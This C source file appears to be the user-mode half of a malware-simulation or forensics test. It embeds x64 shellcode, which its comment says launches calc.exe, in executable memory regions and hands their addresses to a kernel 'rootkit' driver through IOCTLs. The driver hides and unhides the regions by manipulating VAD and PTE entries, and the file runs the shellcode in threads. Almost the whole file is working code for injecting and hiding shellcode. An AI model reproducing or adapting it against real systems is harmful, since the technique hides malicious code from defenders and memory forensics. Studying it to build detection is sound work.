#include "windows.h"
#include <stdio.h>
#include "winioctl.h"
#include "MalwareSimulation.h"


#define SIOCTL_TYPE 40000
// The IOCTL function codes from 0x800 to 0xFFF are for customer use.
#define IOCTL_DATA CTL_CODE( SIOCTL_TYPE, 0x800, 0, FILE_READ_DATA|FILE_WRITE_DATA)
#define IOCTL_UNDO_PTE CTL_CODE( SIOCTL_TYPE, 0x801, METHOD_BUFFERED, FILE_READ_DATA|FILE_WRITE_DATA)
#define IOCTL_REDO_PTE CTL_CODE( SIOCTL_TYPE, 0x802, METHOD_BUFFERED, FILE_READ_DATA|FILE_WRITE_DATA)


#pragma warning(disable : 4245 4127 4838 4309 )


int __cdecl main()
{
	HANDLE hDevice = NULL;
	bool doItLoop = true;
	char doItSwitch;
	DWORD dwBytesRead = 0;
	char ReadBuffer[100] = { 0 };
	DWORD64 data = 0x8877665544332211;
	
	PVOID VADmemPointer = 0x0000;
	PVOID PTEmemPointer = 0x0000;
	PVOID VADPTEmemPointer = 0x0000;
	PVOID CLEANmemPointer = 0x0000;
	DWORD oldProtection = PAGE_EXECUTE_READ;

	HANDLE VADthread;
	HANDLE PTEthread;
	HANDLE VADPTEthread;

	HIDING_INFO hidingInfo;
	PHIDING_INFO pHidingInfo = &hidingInfo;
	LPVOID startAddress = 0x0000;
	LPVOID endAddress = 0x0000;
	DWORD64 procID = GetCurrentProcessId();
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)procID);
	hidingInfo.PID = (int)procID;

	// shellcode opening calc.exe
	unsigned char shellcode[] =
		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
		"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
		"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
		"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
		"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
		"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
		"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
		"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
		"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
		"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
		"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
		"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
		"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
		"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
		"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
		"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"
		"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
		"\x47\x13\x72\x6f\x41\x89\xda\x48\x83\xc4\x20\xc3\x63\x61\x6c"
		"\x63\x2e\x65\x78\x65\x00";


	do
	{
		// switch to control rootkit communication and shellcode execution
		printf("\n\nWhat do you want to do?\n|---> Enter [d(send data to rootkit)/e(execute manipulation)/q(quit)]:\n\n");
		scanf_s("%s", &doItSwitch, 10);
		
		switch (doItSwitch)
		{
		case 'd':

			// Reserve memory that mimics malicious code.
			// VAD target memory
			startAddress = VirtualAlloc(
				(LPVOID)NULL,
				0x2000,
				MEM_RESERVE | MEM_COMMIT,
				PAGE_EXECUTE_READ
			);

			if (startAddress == NULL) {
				printf("VAD Memory allocation failed - base address: %p\n", startAddress);
				return 1;
			}
			else {
				VirtualLock(
					startAddress,
					0x2000
				);

				// change VAD protection to PAGE_EXECUTE_READWRITE -> VAD still contains old PAGE_EXECUTE_READ protection
				VirtualProtect(startAddress, 0x2000, PAGE_EXECUTE_READWRITE, &oldProtection);

				VADmemPointer = startAddress;

				// store address range for data transmission
				hidingInfo.VADtargetStartAddress = (DWORD64)startAddress;
				hidingInfo.VADtargetEndAddress = hidingInfo.VADtargetStartAddress + 0x1000;
				printf("VAD start address: %llx\n", hidingInfo.VADtargetStartAddress);
				printf("VAD end address: %llx\n", hidingInfo.VADtargetEndAddress);

				endAddress = (LPVOID)((DWORD64)startAddress + 0x1000);

				// write data to memory
				memcpy(startAddress, shellcode, sizeof shellcode);
			}


			// Reserve memory that mimics malicious code.
			// PTE target memory
			startAddress = VirtualAlloc(
				(LPVOID)NULL,
				0x2000,
				MEM_RESERVE | MEM_COMMIT,
				PAGE_EXECUTE_READ
			);
			

			if (startAddress == NULL) {
				printf("PTE Memory allocation failed - base address: %p\n", startAddress);
				return 1;
			}
			else {
				VirtualLock(
					startAddress,
					0x2000
				);

				// change VAD protection to PAGE_EXECUTE_READWRITE -> VAD still contains old PAGE_EXECUTE_READ protection
				VirtualProtect(startAddress, 0x2000, PAGE_EXECUTE_READWRITE, &oldProtection);

				PTEmemPointer = startAddress;

				// store address range for data transmission
				hidingInfo.PTEtargetStartAddress = (DWORD64)startAddress;
				hidingInfo.PTEtargetEndAddress = hidingInfo.PTEtargetStartAddress + 0x1000;
				printf("PTE start address: %llx\n", hidingInfo.PTEtargetStartAddress);
				printf("PTE end address: %llx\n", hidingInfo.PTEtargetEndAddress);

				// write data to memory
				memcpy(startAddress, shellcode, sizeof shellcode);

			}

			// Reserve memory that mimics malicious code.
			// VAD/PTE target memory
			startAddress = VirtualAlloc(
				(LPVOID)NULL,
				0x2000,
				MEM_RESERVE | MEM_COMMIT,
				PAGE_EXECUTE_READ
			);
			
			if (startAddress == NULL) {
				printf("VAD/PTE Memory allocation failed - base address: %p\n", startAddress);
				return 1;
			}
			else {
				VirtualLock(
					startAddress,
					0x2000
				);

				// change VAD protection to PAGE_EXECUTE_READWRITE -> VAD still contains old PAGE_EXECUTE_READ protection
				VirtualProtect(startAddress, 0x2000, PAGE_EXECUTE_READWRITE, &oldProtection);

				VADPTEmemPointer = startAddress;

				// store address range for data transmission
				hidingInfo.VADPTEtargetStartAddress = (DWORD64)startAddress;
				hidingInfo.VADPTEtargetEndAddress = hidingInfo.VADPTEtargetStartAddress + 0x1000;
				printf("VAD/PTE start address: %llx\n", hidingInfo.VADPTEtargetStartAddress);
				printf("VAD/PTE end address: %llx\n", hidingInfo.VADPTEtargetEndAddress);

				// write data to memory
				memcpy(startAddress, shellcode, sizeof shellcode);

			}


			// Reserve memory that mimics legitimate code.
			// legitimate memory region
			startAddress = VirtualAlloc(
				(LPVOID)NULL,
				0x2000,
				MEM_RESERVE | MEM_COMMIT,
				PAGE_EXECUTE_READ
			);
			
			if (startAddress == NULL) {
				printf("Memory allocation failed - base address: %llx\n", (DWORD64)startAddress);
				return 1;
			}
			else {
				VirtualLock(
					startAddress,
					0x2000
				);

				CLEANmemPointer = startAddress;

				// store address range for data transmission
				hidingInfo.cleanStartAddress = (DWORD64)startAddress;
				hidingInfo.cleanEndAddress = hidingInfo.cleanStartAddress + 0x1000;
				printf("CLEAN start address: %llx\n", hidingInfo.cleanStartAddress);
				printf("CLEAN end address: %llx\n", hidingInfo.cleanEndAddress);


				endAddress = (LPVOID)((DWORD64)startAddress + 0x1000);

				// write data to memory
				// write first page
				if (WriteProcessMemory(hProcess, startAddress, &data, sizeof(data), NULL))
				{
					printf("WriteProcessMemory first page success - address: 0x%p\n", startAddress);

					// read data from memory
					char buffer[8];
					if (ReadProcessMemory(hProcess, startAddress, buffer, 8, NULL)) {
						DWORD64 bytesRead = *((DWORD64*)buffer);
						printf("ReadProcessMemory first page success: %llx\n", bytesRead);
					}
					else {
						printf("ReadProcessMemory first page failed\n");
					}
				}
				else
				{
					printf("WriteProcessMemory first page failed - Error: %lx\n", GetLastError());
				}
				//write second page
				if (WriteProcessMemory(hProcess, endAddress, &data, sizeof(data), NULL))
				{
					printf("WriteProcessMemory second page success - address: 0x%p\n", endAddress);

					// read data from memory
					char buffer[8];
					if (ReadProcessMemory(hProcess, endAddress, buffer, 8, NULL)) {
						DWORD64 bytesRead = *((DWORD64*)buffer);
						printf("ReadProcessMemory second page success: %llx\n", bytesRead);
					}
					else {
						printf("ReadProcessMemory second page failed\n");
					}
				}
				else
				{
					printf("WriteProcessMemory second page failed - Error: %lx\n", GetLastError());
				}
			}


			// send data to rootkit
			hDevice = CreateFile(L"\\\\.\\DriverKit", GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
			printf("Handle : %p\n", hDevice);

			printf("Pointer : %llx\n", (DWORD64)pHidingInfo);
			printf("PID : %d\n", pHidingInfo->PID);
			printf("vad start : %llx\n", pHidingInfo->VADtargetStartAddress);
			printf("vad end : %llx\n", pHidingInfo->VADtargetEndAddress);
			printf("pte start : %llx\n", pHidingInfo->PTEtargetStartAddress);
			printf("pte end : %llx\n", pHidingInfo->PTEtargetEndAddress);
			printf("vad/pte start : %llx\n", pHidingInfo->VADPTEtargetStartAddress);
			printf("vad/pte end : %llx\n", pHidingInfo->VADPTEtargetEndAddress);
			printf("clean start : %llx\n", pHidingInfo->cleanStartAddress);
			printf("clean end : %llx\n", pHidingInfo->cleanEndAddress);
			DeviceIoControl(hDevice, IOCTL_DATA, (LPVOID)pHidingInfo, sizeof(HIDING_INFO), ReadBuffer, sizeof(ReadBuffer), &dwBytesRead, (LPOVERLAPPED)NULL);
			printf("Message received from kerneland : %s\n", ReadBuffer);
			printf("Bytes read : %d\n", dwBytesRead);

			break;

		case 'e':
			printf("\n\n-------------------------EXECUTE CODE-------------------------\n\n");
			
			// execute code in VAD target memory
			printf("\nbefore VAD thread\n");
			VADthread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)VADmemPointer, NULL, 0, NULL);
			printf("after VAD thread\n");
			Sleep(3000);

			// send IOCTL to undo PTE manipulation in order to execute the shellcode
			DeviceIoControl(hDevice, IOCTL_UNDO_PTE, (LPVOID)NULL, 0, ReadBuffer, sizeof(ReadBuffer), &dwBytesRead, (LPOVERLAPPED)NULL);
			printf("Message received from kerneland : %s\n", ReadBuffer);
			printf("Bytes read : %d\n", dwBytesRead);
			
			DebugBreak();
			// execute code in PTE target memory
			printf("\nbefore PTE thread\n");
			PTEthread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)PTEmemPointer, NULL, 0, NULL);
			printf("after PTE thread\n");
			Sleep(3000);
			
			DebugBreak();
			// execute code in VAD/PTE target memory
			printf("\nbefore VAD/PTE thread\n");
			VADPTEthread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)VADPTEmemPointer, NULL, 0, NULL);
			printf("after VAD/PTE thread\n");
			Sleep(3000);
			
			// send IOCTL to redo PTE manipulation in order to hide the shellcode again
			DeviceIoControl(hDevice, IOCTL_REDO_PTE, (LPVOID)NULL, 0, ReadBuffer, sizeof(ReadBuffer), &dwBytesRead, (LPOVERLAPPED)NULL);
			printf("Message received from kerneland : %s\n", ReadBuffer);
			printf("Bytes read : %d\n", dwBytesRead);

			break;
		case 'q':
			printf("\n\n-------------------------Exit DKOM-------------------------\n\n");
			doItLoop = false;
			
			if (hDevice) {
				printf("Closing device handle\n");
				CloseHandle(hDevice);
			}
			if (hProcess) {
				printf("Closing process handle\n");
				CloseHandle(hProcess);
			}
			
			return 0;
		default:
			printf("wat\n");
		}
	} while (doItLoop);
}


